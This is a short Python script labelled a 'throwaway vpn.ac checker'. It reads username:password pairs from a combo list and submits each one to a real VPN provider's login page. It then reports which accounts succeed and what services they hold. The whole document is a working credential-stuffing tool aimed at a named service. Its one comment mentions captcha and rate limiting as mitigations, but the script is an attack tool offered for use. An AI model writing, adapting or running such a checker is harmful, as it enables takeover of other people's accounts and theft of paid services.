# throwaway vpn.ac checker // mitigation: captcha, rate limiting
from requests import post
up = [line.rstrip('\n').split(':') for line in open('combos.txt')]
for u,p in up:
	x = post("https://vpn.ac/lgn11.php", data={'username':u,'password':p}).text
	if "Active Services" in x: 
		y = x.split("Active Services")[1].split('">')[1].split('<')[0]
		print("\033[92m",u,p,"success! Active Services:",y)
	elif "Login Details Incorrect" in x:
		print("\033[93m",u,p,"fail!")
	else:
		print("\033[91m",u,p,"error?",x)
